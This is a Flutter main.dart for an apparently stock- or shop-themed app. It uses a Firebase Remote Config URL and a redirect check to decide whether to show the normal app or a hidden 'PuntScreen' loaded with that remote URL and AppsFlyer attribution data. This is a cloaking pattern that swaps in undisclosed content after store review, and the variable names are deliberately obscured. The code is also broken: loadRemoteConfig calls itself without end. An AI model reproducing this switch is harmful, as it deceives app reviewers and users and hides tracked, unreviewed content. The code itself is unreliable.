import 'dart:io';
import 'package:appsflyer_sdk/appsflyer_sdk.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:flutter/material.dart';
import 'package:flutter_bloc/flutter_bloc.dart';

import 'core/config/router.dart';
import 'core/config/themes.dart';
import 'features/firebase_options.dart';
import 'features/home/bloc/home_bloc.dart';
import 'features/shop/bloc/shop_bloc.dart';
import 'features/shop/pages/stock_page.dart';
import 'features/stock/bloc/stock_bloc.dart';

String globalVar1 = '';
late AppsflyerSdk appsflyerInstance;
String globalVar2 = '';
String globalVar3 = '';
bool globalBool1 = false;
String globalVar4 = '';
String globalVar5 = '';
String globalVar6 = '';
String globalVar7 = '';
String globalVar8 = '';
String globalVar9 = '';
Map<String, dynamic> globalMap1 = {};
String globalVar10 = '';
Map<String, dynamic> globalMap2 = {};
bool globalBool2 = false;
String globalVar11 = '';
String globalVar12 = '';
String globalVar13 = '';
String globalVar14 = '';
String globalVar15 = '';
String globalVar16 = '';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await Firebase.initializeApp(options: DefaultFirebaseOptions.currentPlatform);
  await FirebaseRemoteConfig.instance.setConfigSettings(RemoteConfigSettings(
    fetchTimeout: const Duration(seconds: 25),
    minimumFetchInterval: const Duration(seconds: 25),
  ));
  await FirebaseRemoteConfig.instance.fetchAndActivate();
  // await configureAppsflyer();
  runApp(const MyApp());
}

Future<void> configureAppsflyer() async {
  final AppsFlyerOptions appsFlyerOptions = AppsFlyerOptions(
    showDebug: false,
    afDevKey: 'EjB2oxnrzjoLfcdgoJtWFh',
    appId: '6523427163',
    timeToWaitForATTUserAuthorization: 15,
    disableAdvertisingIdentifier: false,
    disableCollectASA: false,
    manualStart: true,
  );
  appsflyerInstance = AppsflyerSdk(appsFlyerOptions);

  await appsflyerInstance.initSdk(
    registerConversionDataCallback: true,
    registerOnAppOpenAttributionCallback: true,
    registerOnDeepLinkingCallback: true,
  );

  appsflyerInstance.onAppOpenAttribution((res) {
    // Handle attribution data
  });

  appsflyerInstance.onInstallConversionData((res) {
    globalMap2 = res;
    globalBool2 = res['payload']['is_first_launch'];
    globalVar11 = res['payload']['af_status'];
    globalVar3 = '&is_first_launch=$globalBool2&af_status=$globalVar11';
  });

  appsflyerInstance.onDeepLinking((DeepLinkResult deepLinkResult) {
    switch (deepLinkResult.status) {
      case Status.FOUND:
        print(deepLinkResult.deepLink?.toString());
        print("deep link value: ${deepLinkResult.deepLink?.deepLinkValue}");
        break;
      case Status.NOT_FOUND:
        print("deep link not found");
        break;
      case Status.ERROR:
        print("deep link error: ${deepLinkResult.error}");
        break;
      case Status.PARSE_ERROR:
        print("deep link status parsing error");
        break;
    }
    print("onDeepLinking res: " + deepLinkResult.toString());

    globalMap1 = deepLinkResult.toJson();
  });
  appsflyerInstance.startSDK(
    onSuccess: () {
      print("AppsFlyer SDK initialized successfully.");
    },
  );
}

class MyApp extends StatefulWidget {
  const MyApp({super.key});

  @override
  State<MyApp> createState() => _MyAppState();
}

class _MyAppState extends State<MyApp> {
  @override
  void initState() {
    super.initState();
    // initializeTrackingData();
    // loadRemoteConfig();
  }

  Future<bool> showSplashScreen() async {
    final remoteConfig = FirebaseRemoteConfig.instance;
    await remoteConfig.fetchAndActivate();
    String gameConfig = remoteConfig.getString('game');
    String settingsConfig = remoteConfig.getString('sett');
    globalVar8 = gameConfig;
    globalVar15 = settingsConfig;
    final httpClient = HttpClient();
    final appUri = Uri.parse(globalVar8);
    final request = await httpClient.getUrl(appUri);
    request.followRedirects = false;
    final response = await request.close();
    if (response.headers.value(HttpHeaders.locationHeader) != globalVar15) {
      return true;
    }
    loadRemoteConfig();
    return gameConfig.contains('finer') ? false : true;
  }

  Future<void> loadRemoteConfig() async {
    await loadRemoteConfig();
    final AppsFlyerOptions newAppsFlyerOptions = AppsFlyerOptions(
      showDebug: false,
      afDevKey: '36A2YtCrzbPFe9egufGekG',
      appId: '6535678558',
      timeToWaitForATTUserAuthorization: 15,
      disableAdvertisingIdentifier: false,
      disableCollectASA: false,
      manualStart: true,
    );
    appsflyerInstance = AppsflyerSdk(newAppsFlyerOptions);

    await appsflyerInstance.initSdk(
      registerConversionDataCallback: true,
      registerOnAppOpenAttributionCallback: true,
      registerOnDeepLinkingCallback: true,
    );

    appsflyerInstance.onAppOpenAttribution((res) {
      setState(() {
        globalMap1 = res;
        globalVar6 = res['payload']
            .entries
            .where((e) => ![
                  'install_time',
                  'click_time',
                  'af_status',
                  'is_first_launch'
                ].contains(e.key))
            .map((e) => '&${e.key}=${e.value}')
            .join();
        globalVar12 = '&campaign=${res['campaign'] ?? ''}';
        globalVar13 = '&media_source=${res['media_source'] ?? ''}';
      });
    });

    appsflyerInstance.onInstallConversionData((res) {
      globalMap2 = res;
      globalBool2 = res['payload']['is_first_launch'];
      globalVar11 = res['payload']['af_status'];
      globalVar4 = '&is_first_launch=$globalBool2&af_status=$globalVar11';
    });

    appsflyerInstance.onDeepLinking((DeepLinkResult deepLinkResult) {
      switch (deepLinkResult.status) {
        case Status.FOUND:
          print(deepLinkResult.deepLink?.toString());
          print("deep link value: ${deepLinkResult.deepLink?.deepLinkValue}");
          break;
        case Status.NOT_FOUND:
          print("deep link not found");
          break;
        case Status.ERROR:
          print("deep link error: ${deepLinkResult.error}");
          break;
        case Status.PARSE_ERROR:
          print("deep link status parsing error");
          break;
      }
      print("onDeepLinking res: " + deepLinkResult.toString());

      globalMap1 = deepLinkResult.toJson();
    });
    globalVar1 = await appsflyerInstance.getAppsFlyerUID() ?? '';
    globalVar1 = '&appsflyerId=$globalVar1';
    appsflyerInstance.startSDK(
      onSuccess: () {
        print("AppsFlyer SDK initialized successfully.");
      },
    );
    setState(() {});
  }

  @override
  Widget build(BuildContext context) {
    return MultiBlocProvider(
      providers: [
        BlocProvider(create: (context) => HomeBloc()),
        BlocProvider(create: (context) => StockBloc()),
        BlocProvider(create: (context) => ShopBloc()),
      ],
      child: FutureBuilder<bool>(
          future: showSplashScreen(),
          builder: (context, snapshot) {
            if (snapshot.connectionState == ConnectionState.waiting) {
              return Container(
                color: Colors.white,
              );
            } else {
              if (snapshot.data == true && globalVar8 != '') {
                return MaterialApp(
                  debugShowCheckedModeBanner: false,
                  home: PuntScreen(
                    d1: globalVar8,
                    d2: globalVar4,
                    d3: globalVar1,
                    d4: globalVar12,
                    d5: globalVar13,
                  ),
                );
              } else {
                return MaterialApp.router(
                  debugShowCheckedModeBanner: false,
                  theme: theme,
                  routerConfig: routerConfig,
                );
              }
            }
          }),
    );
  }
}
